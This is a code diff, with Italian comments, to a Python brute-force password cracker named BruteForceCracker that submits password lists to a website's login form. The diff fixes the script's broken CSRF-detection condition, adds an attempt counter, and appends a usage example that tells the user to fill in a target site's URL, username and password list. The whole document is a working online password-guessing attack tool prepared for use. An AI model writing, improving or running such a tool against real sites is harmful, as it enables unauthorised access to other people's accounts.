@@ -21,9 +21,9 @@ class BruteForceCracker:
         # Controlla se il messaggio di errore specificato è presente nella risposta
         if self.error_message in str(response.content):
             return False
-        # Controlla se è stato rilevato un token CSRF nella risposta
-        elif "CSRF" or "csrf" in str(response.content):
-            print("Token CSRF rilevato! BruteF0rce non funziona su questo sito.")
+        # Correggi la condizione per il token CSRF
+        elif "CSRF" in str(response.content) or "csrf" in str(response.content):
+            print("Token CSRF rilevato! BruteForce non funziona su questo sito.")
             sys.exit()
         else:
             # Se la password è stata trovata, stampa l'username e la password
@@ -33,6 +33,8 @@ class BruteForceCracker:
 
 # Funzione per craccare le password
 def crack_passwords(passwords, cracker):
+    # Inizializza il conteggio dei tentativi
+    count = 1
     for password in passwords:
         password = password.strip()
         # Stampa il numero di tentativi e la password corrente
@@ -40,3 +42,17 @@ def crack_passwords(passwords, cracker):
         if cracker.crack(password):
             print("Password trovata!")
             break
+        # Incrementa il conteggio dei tentativi
+        count += 1
+
+# Esempio di utilizzo
+url = "https://example.com/login"  # Sostituisci con l'URL del sito web bersaglio
+username = "username"  # Sostituisci con il nome utente
+error_message = "Invalid password"  # Sostituisci con il messaggio di errore per password non valide
+passwords = ["password1", "password2", "password3"]  # Sostituisci con una lista di password da provare
+
+# Creazione dell'istanza del cracker di password
+cracker = BruteForceCracker(url, username, error_message)
+
+# Crack delle password
+crack_passwords(passwords, cracker)
